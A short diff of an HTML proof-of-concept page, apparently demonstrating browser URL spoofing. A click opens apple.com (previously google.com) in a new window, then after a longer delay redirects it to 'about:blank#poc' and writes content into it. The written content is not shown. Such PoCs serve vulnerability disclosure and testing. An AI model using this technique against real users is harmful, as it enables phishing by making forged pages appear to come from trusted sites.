@@ -9,7 +9,7 @@ button{font:inherit;background:#1f6feb;color:#fff;border:0;border-radius:8px;pad
 <center><img src="logo.png" onclick="spoof()"></center>
 <script>
 function spoof(){
-  const w = window.open('https://www.google.com/', '_blank');
+  const w = window.open('https://www.apple.com/', '_blank');
 
   setTimeout(() => {
     w.location.href = 'about:blank#poc';
@@ -22,7 +22,7 @@ function spoof(){
       `);
       w.document.close();
     }, 50);
-  }, 2500);
+  }, 4500);
 }
 </script>
 </body>
